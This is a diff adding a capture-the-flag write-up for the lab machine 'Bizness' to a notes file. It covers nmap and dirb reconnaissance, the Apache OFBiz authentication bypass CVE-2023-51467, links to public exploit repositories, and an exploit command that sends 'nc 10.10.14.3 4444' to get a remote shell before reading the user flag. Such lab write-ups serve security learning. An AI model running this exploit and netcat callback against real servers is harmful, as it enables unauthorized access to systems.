@@ -671,3 +671,74 @@ else:
 
 **PWNED <3**
 
+
+
+## **Bizness**
+
+### **Reco**
+
+#### **nmap**
+
+`nmap -sVC 10.10.11.252`
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+#### **/etc/hosts**
+
+`sudo nano /etc/hosts`
+
+`10.10.11.252 bizness.htb`
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+#### website
+
+* contact form
+*   Powered by Apache OFBiz
+
+    *   [**CVE-2023-51467**](https://github.com/Chocapikk/CVE-2023-51467)
+
+        * The CVE-2023-51467 vulnerability resides in the login functionality of Apache OfBiz versions prior to 18.12.10. It can be exploited by sending an HTTP request with empty or invalid USERNAME and PASSWORD parameters, which results in an authentication success message, allowing unauthorized access to internal resources.
+
+
+
+
+
+#### dirb
+
+`dirb "https://bizness.htb/" /usr/share/wordlists/dirb/common.txt`
+
+
+
+![](<.gitbook/assets/image (2).png>)\
+
+
+### Weaponisation
+
+#### CVE
+
+* Resources
+  * [https://github.com/Chocapikk/CVE-2023-51467](https://github.com/Chocapikk/CVE-2023-51467)
+  * [https://github.com/hack-parthsharma/Ofbiz-Exploit](https://github.com/hack-parthsharma/Ofbiz-Exploit)
+  * [https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)
+  * [https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit)
+
+### Exploitation
+
+*   **Using Exploit**
+
+    * `git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git`
+    * `cd Apache...`
+
+    ```
+    python3 exploit.py --url https://bizness.htb/ --cmd 'nc 10.10.14.3 4444'
+    ```
+
+
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### User flag
+
+* `cd home/ofbiz`
+* `cat flag.txt`
